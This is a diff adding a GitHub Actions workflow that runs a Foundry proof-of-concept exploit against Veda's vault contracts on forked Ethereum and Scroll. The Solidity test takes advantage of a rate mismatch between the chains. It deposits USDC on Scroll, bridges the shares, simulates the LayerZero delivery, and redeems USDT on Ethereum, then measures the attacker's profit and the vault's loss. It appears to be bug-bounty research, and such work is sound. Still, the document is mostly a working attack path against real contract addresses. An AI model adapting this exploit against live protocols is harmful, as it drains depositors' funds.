@@ -1,0 +1,419 @@
+name: veda-scroll-usd-desync-fixed-block
+
+on:
+  pull_request:
+    branches: [main]
+
+permissions:
+  contents: read
+
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    steps:
+      - uses: foundry-rs/foundry-toolchain@v1
+        with:
+          version: stable
+
+      - name: Select archive-capable RPC endpoints
+        shell: bash
+        run: |
+          python3 - <<'PY'
+          import json, os, subprocess, urllib.request
+
+          ETH_BLOCK = 24924375
+          SCROLL_BLOCK = 33422847
+          ACCOUNTANT = '0xc315D6e14DDCDC7407784e2Caf815d131Bc1D3E7'
+          EXPECTED_ETH = 1154061
+          EXPECTED_SCROLL = 1153628
+          selector = subprocess.check_output(['cast','sig','getRate()'], text=True).strip()
+
+          def rpc(url, method, params):
+              body=json.dumps({'jsonrpc':'2.0','id':1,'method':method,'params':params}).encode()
+              req=urllib.request.Request(url,data=body,method='POST',headers={'content-type':'application/json','user-agent':'veda-desync-poc/2'})
+              with urllib.request.urlopen(req,timeout=35) as r: out=json.loads(r.read().decode())
+              if 'error' in out: raise RuntimeError(out['error'])
+              return out['result']
+
+          def choose(candidates, chain_id, block, expected):
+              failures={}
+              for url in candidates:
+                  try:
+                      assert int(rpc(url,'eth_chainId',[]),16)==chain_id
+                      assert rpc(url,'eth_getBlockByNumber',[hex(block),False]) is not None
+                      raw=rpc(url,'eth_call',[{'to':ACCOUNTANT,'data':selector},hex(block)])
+                      value=int(raw,16)
+                      if value != expected: raise RuntimeError({'expected':expected,'actual':value})
+                      return url, failures
+                  except Exception as e:
+                      failures[url]=repr(e)
+              raise RuntimeError({'no_archive_rpc':failures})
+
+          eth, eth_fail = choose([
+              'https://ethereum-rpc.publicnode.com',
+              'https://eth.drpc.org',
+              'https://rpc.mevblocker.io'
+          ],1,ETH_BLOCK,EXPECTED_ETH)
+          scroll, scroll_fail = choose([
+              'https://scroll-rpc.publicnode.com',
+              'https://rpc.scroll.io',
+              'https://scroll.drpc.org'
+          ],534352,SCROLL_BLOCK,EXPECTED_SCROLL)
+          with open(os.environ['GITHUB_ENV'],'a') as f:
+              f.write(f'ETH_RPC_URL={eth}\nSCROLL_RPC_URL={scroll}\n')
+          with open('rpc-selection.json','w') as f:
+              json.dump({'ethereum':eth,'scroll':scroll,'ethereum_failures':eth_fail,'scroll_failures':scroll_fail},f,indent=2,sort_keys=True)
+          print(json.dumps({'ethereum':eth,'scroll':scroll},indent=2))
+          PY
+
+      - name: Build and execute dual-fork exploit proof
+        shell: bash
+        run: |
+          set -euo pipefail
+          rm -rf poc
+          forge init --force --no-git poc >/dev/null
+          cd poc
+          rm -f src/Counter.sol test/Counter.t.sol script/Counter.s.sol
+          cat > foundry.toml <<'TOML'
+          [profile.default]
+          src = "src"
+          test = "test"
+          libs = ["lib"]
+          solc_version = "0.8.21"
+          evm_version = "cancun"
+          optimizer = true
+          optimizer_runs = 200
+          fs_permissions = [{ access = "read-write", path = "./" }]
+          TOML
+          cat > test/VedaScrollUsdDesync.t.sol <<'SOL'
+          // SPDX-License-Identifier: UNLICENSED
+          pragma solidity 0.8.21;
+
+          import "forge-std/Test.sol";
+
+          interface IERC20 {
+              function balanceOf(address) external view returns (uint256);
+              function approve(address,uint256) external returns (bool);
+          }
+
+          interface IVault is IERC20 {
+              function totalSupply() external view returns (uint256);
+              function authority() external view returns (address);
+          }
+
+          interface IAccountant {
+              function getRate() external view returns (uint256);
+              function getRateInQuoteSafe(address) external view returns (uint256);
+          }
+
+          interface IAuthority {
+              function canCall(address,address,bytes4) external view returns (bool);
+              function isCapabilityPublic(address,bytes4) external view returns (bool);
+          }
+
+          interface ITeller {
+              function authority() external view returns (address);
+              function endpoint() external view returns (address);
+              function peers(uint32) external view returns (bytes32);
+              function shareLockPeriod() external view returns (uint64);
+              function isPaused() external view returns (bool);
+              function assetData(address) external view returns (bool,bool,uint16);
+              function getAmountCanBeSent(uint32) external view returns (uint256,uint256);
+              function getAmountCanBeReceived(uint32) external view returns (uint256,uint256);
+              function previewFee(uint96,address,bytes calldata,address) external view returns (uint256);
+              function depositAndBridge(address,uint256,uint256,address,bytes calldata,address,uint256,address)
+                  external payable returns (uint256);
+              function lzReceive(Origin calldata,bytes32,bytes calldata,address,bytes calldata) external payable;
+          }
+
+          struct Origin { uint32 srcEid; bytes32 sender; uint64 nonce; }
+
+          interface IQueue {
+              struct OnChainWithdraw {
+                  uint96 nonce;
+                  address user;
+                  address assetOut;
+                  uint128 amountOfShares;
+                  uint128 amountOfAssets;
+                  uint40 creationTime;
+                  uint24 secondsToMaturity;
+                  uint24 secondsToDeadline;
+              }
+              function authority() external view returns (address);
+              function nonce() external view returns (uint96);
+              function previewAssetsOut(address,uint128,uint16) external view returns (uint128);
+              function requestOnChainWithdraw(address,uint128,uint16,uint24) external returns (bytes32);
+              function solveOnChainWithdraws(OnChainWithdraw[] calldata,bytes calldata,address) external;
+          }
+
+          interface ISolver {
+              function authority() external view returns (address);
+              function boringRedeemSolve(IQueue.OnChainWithdraw[] calldata,address,bool) external;
+          }
+
+          contract VedaScrollUsdDesyncPoC is Test {
+              uint256 constant ETH_BLOCK = 24_924_375;
+              uint256 constant SCROLL_BLOCK = 33_422_847;
+              uint32 constant ETH_EID = 30_101;
+              uint32 constant SCROLL_EID = 30_214;
+              uint256 constant ONE_SHARE = 1e6;
+              uint256 constant EXPECTED_SOURCE_RATE = 1_153_628;
+              uint256 constant EXPECTED_DEST_RATE = 1_154_061;
+
+              address constant ATTACKER = address(0xA11CE);
+              address constant NATIVE = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
+              address constant VAULT = 0x08c6F91e2B681FaF5e17227F2a44C307b3C1364C;
+              address constant ACCOUNTANT = 0xc315D6e14DDCDC7407784e2Caf815d131Bc1D3E7;
+              address constant TELLER = 0x4DE413a26fC24c3FC27Cc983be70aA9c5C299387;
+              address constant QUEUE = 0x38FC1BA73b7ED289955a07d9F11A85b6E388064A;
+              address constant SOLVER = 0x92b10e02825986bAc2375BdACaFA3e89E3f612aA;
+              address constant SCROLL_USDC = 0x06eFdBFf2a14a7c8E15944D1F4A48F9F95F663A4;
+              address constant ETH_USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
+
+              address[3] operators = [
+                  0xd23086c4e450caaf55704ebc03875a04b4716ca2,
+                  0xdb8345450b0e4d28514a1c18ee1110c417b5b0a2,
+                  0xf8553c8552f906c19286f21711721e206ee4909e
+              ];
+
+              uint256 scrollFork;
+              uint256 ethFork;
+
+              event MessageSent(bytes32 indexed messageId, uint256 shareAmount, address indexed to);
+
+              function setUp() public {
+                  scrollFork = vm.createFork(vm.envString("SCROLL_RPC_URL"), SCROLL_BLOCK);
+                  ethFork = vm.createFork(vm.envString("ETH_RPC_URL"), ETH_BLOCK);
+              }
+
+              function _min(uint256 a, uint256 b) internal pure returns (uint256) { return a < b ? a : b; }
+
+              function _withdrawConfig(address asset)
+                  internal view returns (bool allow,uint24 maturity,uint24 minDeadline,uint16 minDiscount,uint16 maxDiscount,uint96 minimumShares,uint256 capacity)
+              {
+                  (bool ok, bytes memory ret) = QUEUE.staticcall(abi.encodeWithSignature("withdrawAssets(address)", asset));
+                  require(ok, "withdraw config call failed");
+                  if (ret.length == 7 * 32) {
+                      return abi.decode(ret,(bool,uint24,uint24,uint16,uint16,uint96,uint256));
+                  }
+                  require(ret.length == 6 * 32, "unexpected withdraw config length");
+                  (allow,maturity,minDeadline,minDiscount,maxDiscount,minimumShares) =
+                      abi.decode(ret,(bool,uint24,uint24,uint16,uint16,uint96));
+                  capacity = type(uint256).max;
+              }
+
+              function test_fixedBlockScrollToEthereumInsolvencyAndCashout() public {
+                  vm.selectFork(scrollFork);
+                  vm.deal(ATTACKER, 100 ether);
+
+                  uint256 sourceRate = IAccountant(ACCOUNTANT).getRate();
+                  uint256 sourceQuote = IAccountant(ACCOUNTANT).getRateInQuoteSafe(SCROLL_USDC);
+                  assertEq(sourceRate, EXPECTED_SOURCE_RATE, "wrong source rate");
+                  assertEq(sourceQuote, EXPECTED_SOURCE_RATE, "wrong source quote");
+                  assertEq(ITeller(TELLER).shareLockPeriod(), 0, "source share lock closes atomic path");
+                  assertFalse(ITeller(TELLER).isPaused(), "source teller paused");
+                  (bool allowDeposit,,uint16 premium) = ITeller(TELLER).assetData(SCROLL_USDC);
+                  assertTrue(allowDeposit, "source USDC deposit disabled");
+                  assertEq(premium, 0, "source premium destroys clean edge");
+                  address sourceAuth = ITeller(TELLER).authority();
+                  bytes4 dab = ITeller.depositAndBridge.selector;
+                  assertTrue(IAuthority(sourceAuth).canCall(ATTACKER,TELLER,dab), "depositAndBridge not attacker-callable");
+
+                  (,uint256 canSend) = ITeller(TELLER).getAmountCanBeSent(ETH_EID);
+                  assertGt(canSend, 0, "no source bridge capacity");
+
+                  vm.selectFork(ethFork);
+                  vm.deal(ATTACKER, 100 ether);
+                  uint256 destRate = IAccountant(ACCOUNTANT).getRate();
+                  uint256 destQuote = IAccountant(ACCOUNTANT).getRateInQuoteSafe(ETH_USDT);
+                  assertEq(destRate, EXPECTED_DEST_RATE, "wrong destination rate");
+                  assertEq(destQuote, EXPECTED_DEST_RATE, "wrong destination quote");
+                  assertGt(destRate, sourceRate, "no positive rate edge");
+                  (,uint256 canReceive) = ITeller(TELLER).getAmountCanBeReceived(SCROLL_EID);
+                  uint256 destLiquidity = IERC20(ETH_USDT).balanceOf(VAULT);
+                  assertGt(destLiquidity, 1_000e6, "insufficient historical destination liquidity");
+
+                  (bool allowWithdraw,uint24 maturity,uint24 minDeadline,uint16 minDiscount,,uint96 minShares,uint256 capacity) = _withdrawConfig(ETH_USDT);
+                  assertTrue(allowWithdraw, "USDT queue withdrawal disabled");
+                  address queueAuth = IQueue(QUEUE).authority();
+                  assertTrue(IAuthority(queueAuth).canCall(ATTACKER,QUEUE,IQueue.requestOnChainWithdraw.selector), "queue request not public");
+
+                  uint256 maxSharesByLiquidity = destLiquidity * ONE_SHARE / destQuote;
+                  uint256 maxShares = _min(canSend, canReceive);
+                  maxShares = _min(maxShares, maxSharesByLiquidity * 9 / 10);
+                  if (capacity != type(uint256).max) maxShares = _min(maxShares, capacity);
+                  uint256 amount = 50_000e6;
+                  uint256 maxInput = maxShares * sourceQuote / ONE_SHARE;
+                  if (amount > maxInput) amount = maxInput * 9 / 10;
+                  assertGt(amount, 1_000e6, "executable amount too small");
+
+                  vm.selectFork(scrollFork);
+                  deal(SCROLL_USDC, ATTACKER, amount);
+                  uint256 sourceVaultBefore = IERC20(SCROLL_USDC).balanceOf(VAULT);
+                  uint256 sourceAttackerBefore = IERC20(SCROLL_USDC).balanceOf(ATTACKER);
+                  uint256 sourceBaseFee = block.basefee;
+                  uint256 expectedShares = amount * ONE_SHARE / sourceQuote;
+                  bytes memory wildcard = abi.encode(ETH_EID);
+                  uint256 bridgeFee = ITeller(TELLER).previewFee(uint96(expectedShares),ATTACKER,wildcard,NATIVE);
+
+                  vm.startPrank(ATTACKER);
+                  uint256 gasStart = gasleft();
+                  IERC20(SCROLL_USDC).approve(VAULT,amount);
+                  uint256 approveGas = gasStart - gasleft();
+                  vm.recordLogs();
+                  gasStart = gasleft();
+                  ITeller(TELLER).depositAndBridge{value:bridgeFee}(
+                      SCROLL_USDC,amount,0,ATTACKER,wildcard,NATIVE,bridgeFee,address(0)
+                  );
+                  uint256 bridgeGas = gasStart - gasleft();
+                  Vm.Log[] memory logs = vm.getRecordedLogs();
+                  vm.stopPrank();
+
+                  bytes32 guid;
+                  uint256 bridgedShares;
+                  for (uint256 i; i < logs.length; ++i) {
+                      if (logs[i].emitter == TELLER && logs[i].topics.length == 3 &&
+                          logs[i].topics[0] == keccak256("MessageSent(bytes32,uint256,address)")) {
+                          guid = logs[i].topics[1];
+                          assertEq(address(uint160(uint256(logs[i].topics[2]))),ATTACKER,"wrong recipient event");
+                          bridgedShares = abi.decode(logs[i].data,(uint256));
+                      }
+                  }
+                  assertTrue(guid != bytes32(0), "MessageSent not found");
+                  assertEq(bridgedShares,expectedShares,"unexpected bridged shares");
+                  assertEq(IERC20(SCROLL_USDC).balanceOf(VAULT)-sourceVaultBefore,amount,"source vault did not receive principal");
+                  assertEq(sourceAttackerBefore-IERC20(SCROLL_USDC).balanceOf(ATTACKER),amount,"attacker source spend mismatch");
+                  assertEq(IVault(VAULT).balanceOf(ATTACKER),0,"shares should be burned on source");
+
+                  vm.selectFork(ethFork);
+                  uint256 destSupplyBefore = IVault(VAULT).totalSupply();
+                  uint256 destAttackerSharesBefore = IVault(VAULT).balanceOf(ATTACKER);
+                  address endpoint = ITeller(TELLER).endpoint();
+                  bytes32 expectedPeer = bytes32(uint256(uint160(TELLER)));
+                  assertEq(ITeller(TELLER).peers(SCROLL_EID),expectedPeer,"wrong source peer");
+                  uint256 packedMessage = (bridgedShares << 160) | uint160(ATTACKER);
+                  Origin memory origin = Origin(SCROLL_EID,expectedPeer,1);
+                  vm.prank(endpoint);
+                  ITeller(TELLER).lzReceive(origin,guid,abi.encode(packedMessage),address(0),bytes(""));
+                  assertEq(IVault(VAULT).balanceOf(ATTACKER)-destAttackerSharesBefore,bridgedShares,"destination mint mismatch");
+                  assertEq(IVault(VAULT).totalSupply()-destSupplyBefore,bridgedShares,"destination supply mismatch");
+
+                  uint256 immediateLiability = bridgedShares * destQuote / ONE_SHARE;
+                  uint256 immediateGlobalDeficit = immediateLiability - amount;
+                  assertGt(immediateGlobalDeficit,0,"no immediate aggregate insolvency");
+
+                  uint96 requestNonce = IQueue(QUEUE).nonce();
+                  uint128 shares128 = uint128(bridgedShares);
+                  assertGe(shares128,minShares,"below queue minimum");
+                  uint128 expectedPayout = IQueue(QUEUE).previewAssetsOut(ETH_USDT,shares128,minDiscount);
+                  uint40 creation = uint40(block.timestamp);
+                  uint256 destBaseFee = block.basefee;
+
+                  vm.startPrank(ATTACKER);
+                  gasStart = gasleft();
+                  IVault(VAULT).approve(QUEUE,bridgedShares);
+                  uint256 destApproveGas = gasStart - gasleft();
+                  gasStart = gasleft();
+                  IQueue(QUEUE).requestOnChainWithdraw(ETH_USDT,shares128,minDiscount,minDeadline);
+                  uint256 requestGas = gasStart - gasleft();
+                  vm.stopPrank();
+
+                  IQueue.OnChainWithdraw memory req = IQueue.OnChainWithdraw({
+                      nonce:requestNonce,
+                      user:ATTACKER,
+                      assetOut:ETH_USDT,
+                      amountOfShares:shares128,
+                      amountOfAssets:expectedPayout,
+                      creationTime:creation,
+                      secondsToMaturity:maturity,
+                      secondsToDeadline:minDeadline
+                  });
+                  IQueue.OnChainWithdraw[] memory requests = new IQueue.OnChainWithdraw[](1);
+                  requests[0]=req;
+
+                  address solverAuth = ISolver(SOLVER).authority();
+                  address operator;
+                  for (uint256 i; i < operators.length; ++i) {
+                      if (IAuthority(solverAuth).canCall(operators[i],SOLVER,ISolver.boringRedeemSolve.selector)) {
+                          operator=operators[i]; break;
+                      }
+                  }
+                  assertTrue(operator != address(0),"no historical solver operator");
+                  assertTrue(IAuthority(queueAuth).canCall(SOLVER,QUEUE,IQueue.solveOnChainWithdraws.selector),"solver cannot call queue");
+
+                  vm.warp(uint256(creation)+uint256(maturity)+1);
+                  uint256 vaultUsdtBefore = IERC20(ETH_USDT).balanceOf(VAULT);
+                  uint256 attackerUsdtBefore = IERC20(ETH_USDT).balanceOf(ATTACKER);
+                  vm.prank(operator);
+                  ISolver(SOLVER).boringRedeemSolve(requests,TELLER,false);
+                  uint256 attackerPayout = IERC20(ETH_USDT).balanceOf(ATTACKER)-attackerUsdtBefore;
+                  uint256 vaultLoss = vaultUsdtBefore-IERC20(ETH_USDT).balanceOf(VAULT);
+                  assertEq(attackerPayout,expectedPayout,"attacker payout mismatch");
+                  assertEq(vaultLoss,expectedPayout,"destination vault loss mismatch");
+
+                  uint256 grossProfit = attackerPayout-amount;
+                  uint256 attackerGas = approveGas+bridgeGas+destApproveGas+requestGas+200_000;
+                  uint256 conservativeNativeCost = bridgeFee + approveGas*sourceBaseFee + bridgeGas*sourceBaseFee
+                      + destApproveGas*destBaseFee + requestGas*destBaseFee + 200_000*destBaseFee;
+                  uint256 nativeCostUsdMicroAt10kEth = conservativeNativeCost * 10_000e6 / 1 ether;
+                  assertGt(grossProfit,0,"no stablecoin gross profit");
+                  assertGt(grossProfit,nativeCostUsdMicroAt10kEth,"not profitable under conservative ETH price bound");
+
+                  string memory obj = "evidence";
+                  vm.serializeUint(obj,"ethereum_block",ETH_BLOCK);
+                  vm.serializeUint(obj,"scroll_block",SCROLL_BLOCK);
+                  vm.serializeUint(obj,"source_rate",sourceRate);
+                  vm.serializeUint(obj,"destination_rate",destRate);
+                  vm.serializeUint(obj,"source_input_usdc_raw",amount);
+                  vm.serializeUint(obj,"bridged_shares_raw",bridgedShares);
+                  vm.serializeUint(obj,"immediate_global_deficit_usd_raw",immediateGlobalDeficit);
+                  vm.serializeUint(obj,"destination_vault_loss_usdt_raw",vaultLoss);
+                  vm.serializeUint(obj,"attacker_payout_usdt_raw",attackerPayout);
+                  vm.serializeUint(obj,"gross_profit_usd_raw",grossProfit);
+                  vm.serializeUint(obj,"bridge_fee_wei",bridgeFee);
+                  vm.serializeUint(obj,"estimated_attacker_gas",attackerGas);
+                  vm.serializeUint(obj,"conservative_native_cost_wei",conservativeNativeCost);
+                  vm.serializeUint(obj,"native_cost_usd_raw_at_10000_eth",nativeCostUsdMicroAt10kEth);
+                  vm.serializeAddress(obj,"solver_operator",operator);
+                  vm.serializeBytes32(obj,"source_message_guid",guid);
+                  string memory json = vm.serializeBool(obj,"technical_path_pass",true);
+                  vm.writeJson(json,"evidence.json");
+              }
+          }
+          SOL
+          ETH_RPC_URL="$ETH_RPC_URL" SCROLL_RPC_URL="$SCROLL_RPC_URL" \
+            forge test --match-test test_fixedBlockScrollToEthereumInsolvencyAndCashout -vvv | tee ../forge-output.txt
+          cp evidence.json ../veda-scroll-usd-desync-evidence.json
+
+      - name: Build machine verdict
+        if: always()
+        shell: bash
+        run: |
+          python3 - <<'PY'
+          import json, os
+          evidence={}
+          if os.path.exists('veda-scroll-usd-desync-evidence.json'):
+              evidence=json.load(open('veda-scroll-usd-desync-evidence.json'))
+          verdict={
+              'technical_path_pass': bool(evidence.get('technical_path_pass')),
+              'current_submission_gate_pass': False,
+              'reason_current_gate_fails': 'Historical fixed-block condition; Veda requires conditions present at submission.',
+              'evidence': evidence,
+          }
+          open('veda-scroll-usd-desync-verdict.json','w').write(json.dumps(verdict,indent=2,sort_keys=True)+'\n')
+          print(json.dumps(verdict,indent=2,sort_keys=True))
+          PY
+
+      - name: Upload evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: veda-scroll-usd-desync-fixed-block
+          path: |
+            rpc-selection.json
+            forge-output.txt
+            veda-scroll-usd-desync-evidence.json
+            veda-scroll-usd-desync-verdict.json
+          if-no-files-found: warn
+          retention-days: 1
